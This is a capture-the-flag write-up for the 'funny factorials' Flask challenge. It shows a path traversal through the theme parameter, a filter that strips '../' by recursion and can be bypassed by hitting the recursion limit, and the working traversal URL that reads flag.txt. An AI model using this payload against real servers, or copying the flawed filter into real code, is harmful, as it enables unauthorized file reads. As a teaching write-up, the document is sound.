# funny factorials
> I made a factorials app! It's so fancy and shmancy. However factorials don't seem to properly compute at big numbers! Can you help me fix it?

We are given https://funny-factorials.amt.rs/, a Dockerfile, and a python code `app.py`. 

From the Dockerfile:
```
FROM python:3.10-slim-bullseye

RUN pip install --no-cache-dir Flask gunicorn

COPY flag.txt /

COPY app/* /app/

USER 1000

CMD ["gunicorn", "-w", "1", "-b", "0.0.0.0:8080", "wsgi:app"]
```

From this we know that the `flag.txt` is one directory down.

We also note that the python file has a recursion limit:
```python
if __name__ == '__main__':
    sys.setrecursionlimit(100)
    app.run(debug=True)
```

And has a direct `open()` function to read files:
```python
@app.route('/')
def index():
    safe_theme = filter_path(request.args.get("theme", "themes/theme1.css"))
    print(safe_theme)
    f = open(safe_theme, "r")
    theme = f.read()
    f.close()
    return render_template('index.html', css=theme)
```

Now let's try something, if we go to [`view-source:https://funny-factorials.amt.rs/?theme=app.py`](view-source:https://funny-factorials.amt.rs/?theme=app.py), we can see the entirety of app.py in the `<style>` tags!

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Factorial Calculator</title>
    <!-- inline styles passed into the template -->
    <style>
        from flask import Flask, render_template, request
import sys

app = Flask(__name__)

def factorial(n):
    if n == 0:
        return 1
    else:
        try:
            return n * factorial(n - 1)
        except RecursionError:
            return 1
(the rest of the code has been removed to not occupy too much space but you get the idea)
    </style>
  </head>
  <body>
    <h1>Factorial Calculator</h1>
    <form method="POST">
      <label for="number">Enter a number:</label>
      <input type="text" name="number" id="number" />
      <input type="submit" value="Calculate" />
    </form>
    <p>Available themes:</p>
        <a href="?theme=themes/theme1.css">cool</a>
        <a href="?theme=themes/theme2.css">warm</a>
    <ul></ul>
  </body>
</html>
```

So let's try [`view-source:https://funny-factorials.amt.rs/?theme=../flag.txt`](view-source:https://funny-factorials.amt.rs/?theme=../flag.txt):

```html
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

hmm, it seems like there is a method that removes `../`:
```python
def filter_path(path):
    print(path)
    path = path.replace("../", "")
    try:
        return filter_path(path)
    except RecursionError:
        # remove root / from path if it exists
        if path[0] == "/":
            path = path[1:]
        return path
```

So if we do something like `......///`, we can get it to slowly use up its recursion limit like so: 
```
....(../)// -> ..(../)/ -> ../
```

So I tried increasingly many nested `../` (I was too lazy to write a script so I manually binary searched from 50-100) until I reached this: [`view-source:https://funny-factorials.amt.rs/?theme=................................................................................................................................................................../////////////////////////////////////////////////////////////////////////////////flag.txt`](view-source:https://funny-factorials.amt.rs/?theme=................................................................................................................................................................../////////////////////////////////////////////////////////////////////////////////flag.txt)
which gave us the flag: `amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}`